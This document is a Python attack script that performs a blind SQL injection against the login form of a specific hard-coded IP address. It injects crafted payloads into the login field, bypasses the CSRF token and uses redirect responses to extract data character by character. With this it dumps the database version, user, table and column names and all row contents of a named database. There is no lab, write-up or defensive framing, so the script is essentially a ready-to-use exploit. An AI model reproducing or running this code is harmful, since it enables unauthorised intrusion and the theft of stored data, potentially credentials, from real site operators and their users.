#!/usr/bin/env python3
import requests
import re
import sys
import string

URL = "http://37.60.230.11/login"
session = requests.Session()

def get_csrf():
    r = session.get(URL)
    match = re.search(r'_token" value="([^"]+)"', r.text)
    if not match:
        print("ERROR: No CSRF token")
        sys.exit(1)
    return match.group(1)

def query(payload):
    token = get_csrf()
    r = session.post(URL, data={
        "login": payload,
        "password": "test",
        "_token": token
    }, allow_redirects=False)
    return r.status_code == 302

def check(cond_sql):
    """Returns True if condition is true"""
    return query(f"admin' AND ({cond_sql})-- -")

def get_length(sql_expr, max_len=50):
    for i in range(1, max_len + 1):
        if check(f"SELECT LENGTH(({sql_expr}))={i}"):
            return i
    return 0

def get_char(sql_expr, pos):
    """Get character at position pos using binary search"""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if check(f"SELECT ASCII(SUBSTRING(({sql_expr}),{pos},1))<={mid}"):
            hi = mid
        else:
            lo = mid + 1
    return chr(lo) if 32 <= lo <= 126 else '?'

def extract(sql_expr, length=None):
    if length is None:
        length = get_length(sql_expr)
    result = ""
    for pos in range(1, length + 1):
        c = get_char(sql_expr, pos)
        result += c
        sys.stdout.write(f"\r  [{pos}/{length}] -> {result}")
        sys.stdout.flush()
    print()
    return result

# --- ENUMERACION ---
print("[*] Version:")
ver = extract("SELECT version()")
print(f"  [+] {ver}")

print("\n[*] Current user:")
user = extract("SELECT current_user")
print(f"  [+] {user}")

print("\n[*] Database actual:")
db = extract("SELECT current_database()")
print(f"  [+] {db}")

print("\n[*] Buscando tablas en public...")
count = 0
if check("SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog='plazamoyobanba' AND table_schema='public'=1"):
    count = 1
elif check("SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog='plazamoyobanba' AND table_schema='public'=2"):
    count = 2
elif check("SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog='plazamoyobanba' AND table_schema='public'=3"):
    count = 3
elif check("SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog='plazamoyobanba' AND table_schema='public'=4"):
    count = 4
elif check("SELECT COUNT(*) FROM information_schema.tables WHERE table_catalog='plazamoyobanba' AND table_schema='public'=5"):
    count = 5
print(f"  [+] Tablas en public: {count}")

tables = []
for i in range(count):
    sql = f"SELECT table_name FROM information_schema.tables WHERE table_catalog='plazamoyobanba' AND table_schema='public' ORDER BY table_name LIMIT 1 OFFSET {i}"
    name = extract(sql)
    tables.append(name)
    print(f"  [+] Tabla {i+1}: {name}")

# --- COLUMNAS Y DATOS ---
for table in tables:
    print(f"\n\n=== TABLA: {table} ===")
    
    # Contar columnas
    col_sql = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_catalog='plazamoyobanba' AND table_schema='public' AND table_name='{table}'"
    col_count = 0
    for c in range(1, 20):
        if check(f"{col_sql}={c}"):
            col_count = c
            break
    print(f"  Columnas: {col_count}")
    
    # Nombre de columnas
    columns = []
    for j in range(col_count):
        col_sql = f"SELECT column_name FROM information_schema.columns WHERE table_catalog='plazamoyobanba' AND table_schema='public' AND table_name='{table}' ORDER BY ordinal_position LIMIT 1 OFFSET {j}"
        col_name = extract(col_sql)
        columns.append(col_name)
        print(f"  Columna {j+1}: {col_name}")
    
    # Contar filas
    row_sql = f"SELECT COUNT(*) FROM {table}"
    row_count = 0
    for r in range(1, 100):
        if check(f"{row_sql}={r}"):
            row_count = r
            break
    print(f"  Filas: {row_count}")
    
    # Extraer datos
    for row_idx in range(row_count):
        print(f"\n  --- Fila {row_idx + 1} ---")
        for col in columns:
            val_sql = f"SELECT COALESCE(CAST({col} AS text),'NULL') FROM {table} LIMIT 1 OFFSET {row_idx}"
            val_len = get_length(val_sql, 100)
            if val_len > 0:
                val = extract(val_sql, val_len)
                print(f"    {col}: {val}")
            else:
                print(f"    {col}: (vacio/NULL)")
